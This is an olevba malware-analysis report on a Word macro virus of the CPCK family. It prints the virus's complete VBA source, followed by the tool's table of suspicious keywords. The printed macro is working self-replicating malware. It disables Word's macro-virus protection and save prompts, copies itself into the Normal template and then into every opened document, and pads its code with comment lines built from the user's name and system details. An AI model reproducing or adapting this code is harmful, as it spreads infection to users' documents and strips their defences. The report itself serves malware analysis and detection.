olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-0d7120ace4e8bf4fbaa2ab312c88b7a7a2c309fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-0d7120ace4e8bf4fbaa2ab312c88b7a7a2c309fc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
On Error Resume Next
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Options.ConfirmConversions = 0
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Options.SaveNormalPrompt = 0
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Options.VirusProtection = 0
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
DH62 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
MF63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Application.EnableCancelKey = 0
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If DH62 > 0 And MF63 > 0 Then GoTo EJ47
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If DH62 = 0 Then
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Set JH33 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
MI69 = True
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
End If
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If MF63 = 0 Then
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Set JH33 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
MT67 = True
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
End If
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If MT67 <> True And MI69 <> True Then GoTo EJ47
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If MT67 = True Then JH33.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DH62 - 1))
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
If MI69 = True Then JH33.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MF63 - 1))
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
With JH33.CodeModule
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
For x = 2 To (JH33.CodeModule.CountOfLines - 1) Step 2
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
Next x
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
End With
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
EJ47:
'TesterT00013322.DOC00013322.DOC2/23/01 5:47:14 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

